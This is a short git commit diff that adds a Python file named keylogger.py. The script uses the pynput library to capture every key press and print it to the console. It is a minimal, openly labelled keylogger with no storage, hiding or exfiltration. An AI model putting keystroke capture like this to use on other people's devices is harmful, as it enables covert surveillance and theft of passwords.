5409f71e3880284e96037a71588481034a9b10e7
owen62 <65536127+owen62@users.noreply.github.com>
2023-09-26 22:54:58 +0200

    first script

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,10 @@
-print("hello world")
+from pynput import keyboard #pynput python librairy use to make the link between the OS and the peripheral devices (mouse, keyboard)
+
+def on_press(key):
+    try:
+        print(f'key {key.char} pressed')
+    except AttributeError:
+        print(f'Special key {key} pressed')
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
